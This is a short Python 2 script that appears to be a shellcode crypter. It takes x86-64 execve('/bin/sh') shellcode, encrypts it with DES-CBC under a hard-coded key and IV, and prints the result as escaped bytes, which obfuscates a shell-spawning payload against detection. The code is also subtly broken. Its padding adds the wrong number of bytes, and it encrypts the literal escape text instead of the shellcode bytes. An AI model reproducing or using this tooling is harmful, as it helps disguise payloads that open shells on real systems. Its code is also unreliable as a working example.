from Crypto.Cipher import DES

def padding(shellcode):
    n = len(shellcode) % 8
    return shellcode + (b' ' * n)

def encrypt_shellcode(key, shellcode, iv):

	des = DES.new(key, DES.MODE_CBC, iv)

	#pad the shellcode as input strings must be a multiple of 8 in length
	padded_shellcode = padding(shellcode)

	encrypted_text = des.encrypt(padded_shellcode)
	encrypted_text_in_hex = encrypted_text.encode('hex')

	print "Dumping DES (MODE_CBC) encrypted shellcode...\n"
	print '\\x' + '\\x'.join([encrypted_text_in_hex[i:i+2] for i in range(0, len(encrypted_text_in_hex), 2)])


def main():

	key = "v5sD3GE4" # needs to be 8 bytes
	iv = "hoqCHQE6"  # needs to be 8 bytes

	#execve-stack shellcode
	shellcode = r"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
	
	encrypt_shellcode(key, shellcode, iv)

if __name__ == '__main__':
    main()
